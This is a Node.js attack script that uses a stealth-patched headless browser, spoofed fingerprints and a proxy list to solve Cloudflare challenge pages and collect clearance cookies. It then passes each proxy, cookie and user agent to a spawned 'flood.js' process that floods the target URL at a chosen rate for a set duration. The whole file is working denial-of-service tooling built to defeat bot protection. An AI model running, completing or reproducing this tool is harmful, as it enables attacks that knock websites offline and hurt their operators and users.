const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");

const COOKIES_MAX_RETRIES = 1;
const errorHandler = error => {
    console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
    const index = this.indexOf(item);
    if (index !== -1) {
        this.splice(index, 1);
    }
    return item;
};
async function spoofFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(window, 'screen', {
            value: {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 64,
                pixelDepth: 64
            }
        });
        Object.defineProperty(navigator, 'userAgent', {
            value: 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36'
        });
        const gl = canvas.getContext('webgl');
        gl.getParameter = function(parameter) {
            if (parameter === gl.VENDOR) {
                return 'WebKit';
            } else if (parameter === gl.RENDERER) {
                return 'Apple GPU';
            } else {
                return gl.getParameter(parameter);
            }
        };
        Object.defineProperty(navigator, 'plugins', {
            value: [{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 }]
        });
Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
Object.defineProperty(navigator, 'webdriver', { get: () => false });
Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
Object.defineProperty(navigator, 'deviceMemory', { value: 256 });
        Object.defineProperty(document, 'cookie', {
          configurable: true,
          enumerable: true,
          get: function() { return ''; },
          set: function() {}
        });
        Object.defineProperty(navigator, 'cookiesEnabled', {
          configurable: true,
          enumerable: true,
          get: function() { return true; },
          set: function() {}
       });
        Object.defineProperty(window, 'localStorage', {
         configurable: true,
         enumerable: true,
         value: {
         getItem: function() { return null; },
         setItem: function() {},
         removeItem: function() {}
          }
       });
Object.defineProperty(navigator, 'doNotTrack', { value: null });
Object.defineProperty(navigator, 'maxTouchPoints', { value: 10 });
Object.defineProperty(navigator, 'language', { value: 'en-US' });
        Object.defineProperty(navigator, 'vendorSub', {
            value: ''
        });
    });
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
if (process.argv.length < 6) {
    console.error("node browser target theard proxy rate time");
    process.exit(1);
}
const targetURL = process.argv[2];
const threads = process.argv[3];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = process.argv[6];

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/);
        return proxies;
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);
const userAgents = () => {
    const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
    const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
    const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
    const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"];
    const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
    const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
    const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
    const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
    const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);

    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} ` +
        `(${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ` +
        `${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} ` +
        `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
};

const colors = {
	COLOR_RED: "\x1b[31m",
    COLOR_PINK: "\x1b[35m",
    COLOR_WHTIE: "\x1b[37m",
    COLOR_YELLOW: "\x1b[33m",
    COLOR_GREEN: "\x1b[32m",
    cc: "\x1b[38;5;57m",
    COLOR_RESET: "\x1b[0m"
};

function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
};

async function detectChallenge(browser, page, browserProxy) {
    const title = await page.title();
    const content = await page.content();
  
    if (content.includes("challenge-platform")) {
        colored(colors.COLOR_PINK, "Start Bypass Proxy: " + browserProxy);
    
        try {
            await sleep(17);
            await page.waitForSelector("body > div.main-wrapper > div > div > div > div", { timeout: 10000 });
            
            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            if (captchaContainer) {
                await captchaContainer.click({ offset: { x: 20, y: 20 } });
            }
        } catch (error) {
            
        } finally {
            await sleep(8);
            return;
        }
    }
    
  
    colored(colors.COLOR_YELLOW, "No challenge detected " + browserProxy);
    await sleep(10);
}

async function openBrowser(targetURL, browserProxy) {
    const userAgent = userAgents();
    const options = {
        headless: "new",
        ignoreHTTPSErrors: true,
        args: [
            "--proxy-server=http://" + browserProxy,
            "--no-sandbox",
            "--no-first-run",
            "--ignore-certificate-errors",
            "--disable-extensions",
            "--test-type",
            "--user-agent=" + userAgent,
            "--disable-gpu",
            "--disable-browser-side-navigation"
        ]
    };

    let browser;
    try {
        browser = await puppeteer.launch(options);
    } catch (error) {
        return null;
    }

    try {
        const [page] = await browser.pages();
        const client = page._client();
        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com") && frame._id) {
                try {
                    client.send("Target.detachFromTarget", { targetId: frame._id });
                } catch (error) {
                }
            }
        });
        
        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await detectChallenge(browser, page, browserProxy);
        const title = await page.title();
        const cookies = await page.cookies(targetURL);
    
        return {
            title: title,
            browserProxy: browserProxy,
            cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
            userAgent: userAgent
        };
    } catch (error) {
        return null;
    } finally {
        await browser.close();
    }
}


async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === COOKIES_MAX_RETRIES) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
    } else {
        try {
            const response = await openBrowser(targetURL, browserProxy);
            if (response) {
                if (response.title === "Just a moment...") {
                    await browser.close();
                    return;
                 }
                 if (response.title === "Attention Required! | Cloudflare") {
                    colored(colors.COLOR_RED, "Proxy Blocked: " + response.browserProxy);
                    await browser.close();
                    return;
                 }
                const cookies = " [ Title ]:" + response.title + "\n [ Proxy ]: " + response.browserProxy + "\n [ Cookies ]: " + response.cookies + "\n}";
                console.log(colors.COLOR_GREEN,"{ " + "\n" + cookies);
                spawn("node", [
                  "flood.js",
                  targetURL,
                  "100",
                  "2",
                  response.browserProxy,
                  rates,
                  response.cookies,
                  response.userAgent
                ]);
            }
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        } catch (error) {
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        }
    }
}

const queue = async.queue(function (task, done) {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

const { exec } = require('child_process');

async function main() {
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({ browserProxy: browserProxy });
    }

    await sleep(duration);
    queue.kill();

    exec('pkill -f flood.js', (err) => {
        if (err) console.error('Lỗi khi pkill flood.js:', err.message);
    });

    exec('pkill chrome', (err) => {
        if (err) console.error('Lỗi khi pkill Chrome:', err.message);
    });

    process.exit();
}

main();
